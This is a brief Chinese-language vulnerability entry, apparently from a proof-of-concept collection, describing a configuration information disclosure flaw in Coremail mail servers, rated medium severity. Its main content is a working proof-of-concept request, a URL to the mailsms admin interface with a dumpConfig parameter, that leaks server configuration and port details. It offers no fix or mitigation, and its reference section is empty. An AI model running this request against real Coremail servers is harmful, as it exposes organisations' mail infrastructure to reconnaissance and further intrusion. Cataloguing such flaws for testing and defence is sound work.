# Coremail 配置信息泄露漏洞

## 漏洞描述
Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
POC为

```plain
http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
```

![](images/202202101913188.png)
